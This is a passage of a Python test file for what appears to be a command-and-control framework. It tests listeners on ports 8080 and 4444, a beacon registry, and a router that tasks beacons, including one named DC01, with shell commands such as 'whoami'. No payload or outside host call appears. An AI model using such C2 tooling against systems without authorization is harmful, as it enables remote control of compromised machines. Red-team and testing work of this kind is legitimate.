        mgr = ListenerManager(registry, crypto)
        mgr.create(ListenerType.HTTP, port=8080)
        mgr.create(ListenerType.TCP, port=4444)
        s = mgr.summary()
        assert s["total"] == 2


class TestTaskRouter:
    """Tests for task routing."""

    def test_task_beacon(self) -> None:
        registry = BeaconRegistry()
        beacon = registry.register(metadata={"hostname": "DC01"})
        beacon.checkin()  # Activate

        router = TaskRouter(registry)
        task = router.task_beacon(beacon.beacon_id, "shell", operator="admin", cmd="whoami")
        assert task is not None
        assert task.command == "shell"
        assert len(router.task_history) == 1

    def test_task_dead_beacon(self) -> None:
        registry = BeaconRegistry()
        beacon = registry.register()
        beacon.state = BeaconState.DEAD

        router = TaskRouter(registry)
        task = router.task_beacon(beacon.beacon_id, "shell")
        assert task is None

    def test_task_all(self) -> None:
        registry = BeaconRegistry()
        b1 = registry.register()
        b2 = registry.register()
        b1.checkin()
        b2.checkin()

        router = TaskRouter(registry)
        tasks = router.task_all("shell", operator="admin", cmd="hostname")
        assert len(tasks) == 2


class TestTeamServer:
    """Tests for team server init."""

    def test_init(self) -> None:
        server = TeamServer(port=0, data_dir=Path("/tmp/forge_c2_test"))
        assert server.registry is not None
        assert server.crypto is not None
        assert server.operators is not None
        assert server.listeners is not None
        assert server.router is not None

    def test_status(self) -> None:
        server = TeamServer(port=0)
        status = server.status()
        assert "beacons" in status
        assert "listeners" in status
        assert "operators" in status
